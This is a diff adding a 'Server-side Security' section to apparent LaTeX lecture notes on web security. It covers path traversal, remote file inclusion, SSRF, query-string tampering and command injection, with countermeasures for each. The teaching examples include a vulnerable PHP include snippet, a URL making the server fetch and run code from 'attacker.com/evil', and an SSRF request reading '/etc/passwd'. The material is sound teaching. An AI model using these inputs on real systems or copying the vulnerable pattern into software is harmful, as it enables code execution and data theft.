@@ -1108,4 +1108,95 @@ Countermeasures:
   \item Use \texttt{Referrer-Policy} response header to control the sending of the \texttt{Referer} header.
 \end{itemize}
 
+\section{Server-side Security}
+While insider threats are very dangerous and social engineering gets a lot of press, hacking and external attacks are the cause of most data breaches.
+Discovery and containment do not stop breaches - most breaches are discovered only after 90\% of the data has been stolen.
+
+\subsection{Web Server Architectures}
+\begin{itemize}
+  \item \textbf{CGI Scripting}:
+    \begin{itemize}
+      \item Server passes requests to an appropriate executable.
+      \item Headers passes as environment variables or arguments, data passed via stdin/out.
+      \item Easy to deploy, dated.
+    \end{itemize}
+  \item \textbf{Server-side Scripting}:
+    \begin{itemize}
+      \item Web server embeds database, or directly executes scripts.
+      \item Faster and more powerful, but more dangerous (can reconfigure server).
+    \end{itemize}
+  \item \textbf{Fast CGI}:
+    \begin{itemize}
+      \item Persistent process handles multiple requests.
+      \item Web server uses TCP or local sockets to talk to application server (can be remote).
+      \item Load balancing.
+    \end{itemize}
+  \item \textbf{Reverse Proxy}:
+    \begin{itemize}
+      \item Lean, fast, secure server handles static content, TLS termination, etc.
+      \item Application server focuses on application logic.
+    \end{itemize}
+\end{itemize}
+
+\subsection{Path Traversal}
+Attacker input can cause the server to disclose an unintended resource (e.g. \texttt{/etc/passwd}).
+The server identifies a resource based on user input, so the attacker requests files likely to exist and unlikely to exist, comparing the responses - the attacker can guess the path to a private resource in the URL.
+
+Countermeasures:
+\begin{itemize}
+  \item Special \texttt{www} user account for web app server with access only to public files.
+  \item \texttt{chroot} jail to sandbox the web app process to a virtual file system.
+  \item Access control restrictions.
+\end{itemize}
+
+\subsection{Remove File Inclusion}
+We may include in our \texttt{index.php}:
+\begin{verbatim}
+  $nextpage = $_REQUEST["subpage"];
+  include($nextpage.".php");
+\end{verbatim}
+with the intended usage of \texttt{subpage} in the URL being a page on the site.
+If the \texttt{php.ini} settings have \texttt{allow\_url\_fopen = 1}, then file operations can follow urls:
+\begin{enumerate}
+  \item Attacker can put in the url \texttt{...subpage=http://attacker.com/evil}.
+  \item The server includes, and therefore executes, the external file.
+\end{enumerate}
+
+To be more secure, we should only allow \texttt{subpage} to have a value from a whitelist of allowed page names, preventing any arbitrary input.
+
+\subsection{Server-side Request Forgery}
+If the attacker can control the parameter that becomes the URL of the request issued by the server, then they can access information beyond the firewall as the server requests have server privileges and can address the internal network.
+e.g.\ \texttt{GET /?url=file:///etc/passwd HTTP/1.1}
+
+Countermeasures:
+\begin{itemize}
+  \item Prevent (blacklist) the use of the URL parameter.
+  \item Whitelist requests that the server-side application can use.
+  \item Do not handle unexpected responses.
+\end{itemize}
+
+\subsection{Untrusted Query String}
+e.g.\ \texttt{http://example.com/update.php?account=user\_id&action=unsubscribe}, the attacker can tamper with the query string:
+\begin{itemize}
+  \item \textbf{Insecure direct object references} - the application exposes a reference to an internal implementation object (user id), the attacker can guess a valid id to target a different user.
+  \item \textbf{Missing function-level access control} - the attacker can set the action arbitrarily, e.g. to \texttt{upgrade\_to\_root}; even if this was not a choice available, it is accepted by the server without further checks.
+\end{itemize}
+
+Countermeasures:
+\begin{itemize}
+  \item Do not trust user input.
+  \item Deny operations by default, enable after authorization checks.
+  \item Bind user parameters to user session.
+\end{itemize}
+
+\subsection{Command Injection}
+The attacker input causes the execution of undesired commands on the server, usually by escaping the intended command and inputting their own.
+
+Countermeasures:
+\begin{itemize}
+  \item Blacklist inputs matching forbidden patterns - fragile as new dangerous parameters can be used.
+  \item Whitelist allowed patterns - more robust but tricky to avoid false positives.
+  \item Static and dynamic analysis.
+\end{itemize}
+
 \end{document}
